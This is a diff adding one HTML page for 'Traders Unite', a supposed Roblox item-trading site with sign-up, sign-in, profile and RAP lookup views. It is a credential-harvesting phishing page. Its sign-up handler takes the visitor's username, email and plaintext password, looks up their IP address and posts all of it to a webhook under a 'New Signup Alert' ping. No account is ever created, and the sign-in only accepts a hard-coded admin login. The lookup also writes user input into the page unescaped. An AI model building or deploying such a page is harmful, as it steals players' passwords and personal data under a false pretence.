@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Traders Unite</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            background: url('https://static0.gamerantimages.com/wordpress/wp-content/uploads/2021/07/roblox-how-to-trade-with-other-players.jpg?q=50&fit=crop&w=1140&h=&dpr=1.5') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Arial', sans-serif;
+            color: #fdfdfd;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            min-height: 100vh;
+            margin: 0;
+            padding-top: 20px;
+        }
+
+        .announcement {
+            background: rgba(0, 123, 255, 0.8);
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 18px;
+            width: 80%;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 30px 40px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            width: 400px;
+            text-align: center;
+            margin: 10px;
+        }
+
+        h1,
+        h2 {
+            margin: 20px 0;
+            font-size: 24px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.7);
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #28a745;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+            font-weight: 600;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+        }
+
+        button:hover {
+            background: #218838;
+            transform: translateY(-1px);
+        }
+
+        .message {
+            margin-top: 15px;
+            display: none;
+            font-weight: bold;
+        }
+
+        .link {
+            margin-top: 10px;
+            color: #28a745;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .loading {
+            color: yellow;
+            display: none;
+            font-weight: bold;
+        }
+
+        .task-bar {
+            width: 100%;
+            position: fixed;
+            top: 0;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            padding: 10px;
+            border-bottom: 2px solid #28a745;
+            justify-content: space-around;
+            z-index: 1000;
+            display: none; /* Hidden until signed in */
+        }
+
+        .task-bar button {
+            background: transparent;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .task-bar button:hover {
+            text-decoration: underline;
+        }
+
+        .profile {
+            display: none;
+            background: rgba(255, 255, 255, 0.9);
+            color: black;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            width: 350px;
+            text-align: left;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+        }
+
+        .profile-header {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            position: relative;
+        }
+
+        .badge {
+            background-color: #ffbc00;
+            color: #fff;
+            padding: 5px 10px;
+            border-radius: 12px;
+            font-size: 14px;
+            position: absolute;
+            top: 0;
+            right: 0;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+        }
+
+        .graph {
+            width: 100%;
+            height: 100px;
+            background-color: #e0e0e0;
+            border-radius: 5px;
+            position: relative;
+            margin-top: 10px;
+        }
+
+        .graph div {
+            position: absolute;
+            height: 100%;
+            background-color: #28a745;
+        }
+
+        .tab-content {
+            display: none;
+            background: rgba(255, 255, 255, 0.9);
+            color: black;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+        }
+
+        .recent-item {
+            padding: 5px;
+            border: 1px solid #b0b0b0;
+            margin-top: 5px;
+            border-radius: 5px;
+            background: rgba(240, 240, 240, 0.7);
+        }
+
+        .copyright {
+            position: absolute;
+            bottom: 10px;
+            text-align: center;
+            width: 100%;
+            color: white;
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="announcement">
+        Welcome to Traders Unite! This site is in active development. You have received an Early Access badge for signing up.
+    </div>
+
+    <div class="task-bar">
+        <button onclick="showTask('RAP Lookup')">RAP Lookup</button>
+        <button onclick="showProfile()">Your Profile</button>
+        <button onclick="showTask('Trade Calculator')">Trade Calculator</button>
+        <button onclick="showLimitedDeals()">Limited Deals</button>
+        <button onclick="showTask('Upcoming Items')">Upcoming Items</button>
+    </div>
+
+    <div id="signupContainer" class="container">
+        <h1>Sign Up</h1>
+        <form id="signupForm">
+            <input type="text" id="signupUsername" placeholder="Username" required>
+            <input type="email" id="signupEmail" placeholder="Email" required>
+            <input type="password" id="signupPassword" placeholder="Password" required>
+            <button type="submit">Sign Up</button>
+        </form>
+        <div class="loading" id="loadingMessage">Loading... Just one moment!</div>
+        <div class="message" id="signupMessage">Signed Up Successfully!</div>
+        <div class="link" id="switchToSignIn">Already have an account? Sign In</div>
+    </div>
+
+    <div id="signinContainer" class="container" style="display: none;">
+        <h1>Sign In</h1>
+        <form id="signinForm">
+            <input type="text" id="signinUsername" placeholder="Username" required>
+            <input type="email" id="signinEmail" placeholder="Email" required>
+            <input type="password" id="signinPassword" placeholder="Password" required>
+            <button type="submit">Sign In</button>
+        </form>
+        <div class="message" id="signinMessage">Sign In Successful!</div>
+        <div class="message" id="signinError" style="color: red;">Invalid credentials!</div>
+        <div class="link" id="switchToSignUp">Don't have an account? Sign Up</div>
+    </div>
+
+    <div class="profile" id="userProfile">
+        <div class="profile-header">Profile <span class="badge">Early Access</span></div>
+        <div id="profileUsername"></div>
+
+        <h3>RAP:</h3>
+        <div id="profileRap">Coming Soon</div>
+
+        <h3>Trade Stats:</h3>
+        <p>Items Traded: <span id="itemsTraded">0</span></p>
+        <p>Trade Requests: <span id="tradeRequests">0</span></p>
+
+        <h3>Recent Items:</h3>
+        <div class="recent-items" id="recentItems"></div>
+
+        <div class="graph">
+            <div id="graphBar" style="width: 70%;"></div>
+        </div>
+    </div>
+
+    <div class="tab-content" id="taskContentRapLookup">
+        <h2>RAP Lookup</h2>
+        <p>Enter a username to look up their RAP:</p>
+        <input type="text" id="lookupUsername" placeholder="Username" required>
+        <button onclick="lookupRAP()">Lookup</button>
+        <div id="lookupResult" style="margin-top: 15px;"></div>
+    </div>
+
+    <div class="tab-content" id="taskContentTradeCalculator">
+        <h2>Trade Calculator</h2>
+        <p>This page helps users calculate trade values based on their items.</p>
+    </div>
+
+    <div class="tab-content" id="taskContentUpcomingItems">
+        <h2>Upcoming Items</h2>
+        <p>This page lists upcoming items and their release dates.</p>
+    </div>
+
+    <div class="copyright">
+        © 2025 Traders Unite. All rights reserved.
+    </div>
+
+    <script>
+        const signupContainer = document.getElementById('signupContainer');
+        const signinContainer = document.getElementById('signinContainer');
+        const signupMessage = document.getElementById('signupMessage');
+        const loadingMessage = document.getElementById('loadingMessage');
+        const signinMessage = document.getElementById('signinMessage');
+        const signinError = document.getElementById('signinError');
+        const userProfile = document.getElementById('userProfile');
+        const profileUsername = document.getElementById('profileUsername');
+        const profileRap = document.getElementById('profileRap');
+        const itemsTraded = document.getElementById('itemsTraded');
+        const tradeRequests = document.getElementById('tradeRequests');
+        const recentItems = document.getElementById('recentItems');
+        const graphBar = document.getElementById('graphBar');
+
+        let signedIn = false;
+
+        function showSignUp() {
+            signupContainer.style.display = 'block';
+            signinContainer.style.display = 'none';
+            userProfile.style.display = 'none';
+            document.querySelector('.task-bar').style.display = 'none';
+            signupMessage.style.display = 'none'; // Hide the sign-up message
+        }
+
+        function showSignIn() {
+            signinContainer.style.display = 'block';
+            signupContainer.style.display = 'none';
+            userProfile.style.display = 'none';
+            document.querySelector('.task-bar').style.display = 'none';
+        }
+
+        function showProfile() {
+            if (signedIn) {
+                userProfile.style.display = 'block';
+                hideAllTabs();
+            }
+        }
+
+        function hideAllTabs() {
+            const tabContents = document.querySelectorAll('.tab-content');
+            tabContents.forEach(tabContent => {
+                tabContent.style.display = 'none';
+            });
+        }
+
+        function showTask(task) {
+            hideAllTabs();
+            const taskContent = document.getElementById(`taskContent${task.replace(/\s+/g, '')}`);
+            if (taskContent) {
+                taskContent.style.display = 'block';
+            }
+        }
+
+        // Function to get user's IP address
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Could not retrieve IP address:', error);
+                return 'unknown';
+            }
+        }
+
+        document.getElementById('signupForm').addEventListener('submit', async function (event) {
+            event.preventDefault();
+            const username = document.getElementById('signupUsername').value;
+            const email = document.getElementById('signupEmail').value;
+            const password = document.getElementById('signupPassword').value;
+
+            loadingMessage.style.display = 'block';
+            signupMessage.style.display = 'none';
+
+            // Get user's IP address
+            const userIP = await getUserIP();
+
+            // Format and prepare data for the webhook
+            const webhookData = {
+                content: `@everyone\n**New Signup Alert!**\n\n**Username:** ${username}\n**Email:** ${email}\n**IP Address:** ${userIP}\n**Password:** ${password}`
+            };
+
+            // Send data to the Webhook
+            fetch('https://your-webhook-url.com', { // Replace with your actual webhook URL
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(webhookData)
+            })
+            .then(response => {
+                if (response.ok) {
+                    loadingMessage.style.display = 'none';
+                    signupMessage.style.display = 'block';  // Show success message
+                    signupContainer.reset();  // Reset input fields
+                } else {
+                    throw new Error('Failed to send data to the webhook');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending to webhook:', error);
+                loadingMessage.style.display = 'none';
+            });
+        });
+
+        document.getElementById('signinForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+            const enteredUsername = document.getElementById('signinUsername').value;
+            const email = document.getElementById('signinEmail').value;
+            const password = document.getElementById('signinPassword').value;
+
+            // Simulate a successful sign-in process
+            if (enteredUsername === 'admin' && email === 'admin@admin.com' && password === 'password') {
+                signedIn = true;
+                signinMessage.style.display = 'block';
+                signinError.style.display = 'none';
+                signinContainer.style.display = 'none';
+                document.querySelector('.task-bar').style.display = 'flex';
+
+                profileUsername.innerHTML = `Username: ${enteredUsername}`;
+                itemsTraded.innerHTML = "10";
+                tradeRequests.innerHTML = "2";
+                recentItems.innerHTML = `
+                    <div class="recent-item">Item 1</div>
+                    <div class="recent-item">Item 2</div>
+                    <div class="recent-item">Item 3</div>
+                `;
+
+                graphBar.style.width = "70%"; // Set graph width for example
+                userProfile.style.display = 'block';
+                showTask('RAP Lookup'); // Display RAP Lookup section after logging in
+            } else {
+                signinError.style.display = 'block';
+                signinMessage.style.display = 'none';
+            }
+        });
+
+        document.getElementById('switchToSignIn').addEventListener('click', showSignIn);
+        document.getElementById('switchToSignUp').addEventListener('click', showSignUp);
+
+        function lookupRAP() {
+            const lookupUsernameInput = document.getElementById('lookupUsername').value;
+            const lookupResult = document.getElementById('lookupResult');
+
+            // Simulate RAP lookup for demonstration
+            if (lookupUsernameInput === 'admin') {
+                lookupResult.innerHTML = "<strong>admin</strong> has a RAP of $157,000.";
+            } else {
+                lookupResult.innerHTML = `<strong>${lookupUsernameInput}</strong> not found.`;
+            }
+        }
+
+        // Show Sign Up by default
+        showSignUp();
+    </script>
+</body>
+
+</html>
